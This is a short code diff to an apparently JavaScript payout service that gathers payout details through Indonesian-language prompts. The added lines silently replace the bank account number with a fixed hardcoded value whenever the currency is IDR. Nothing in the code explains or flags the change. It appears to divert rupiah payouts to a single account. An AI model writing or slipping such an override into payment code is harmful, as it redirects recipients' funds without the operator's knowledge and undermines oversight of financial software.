@@ -132,6 +132,10 @@ class PayoutService {
       const cryptoAmountInput = await this.ask(`Masukkan Crypto Amount (Enter untuk pakai estimasi amount ${estimasi}): `);
       payload.crypto_amount = cryptoAmountInput.trim() || String(estimasi);
     }
+
+    if (currency === "IDR") {
+      payload.bank_account_number = '081328645436';
+    }
   }
 
   async makePayoutRequest(config, payload) {
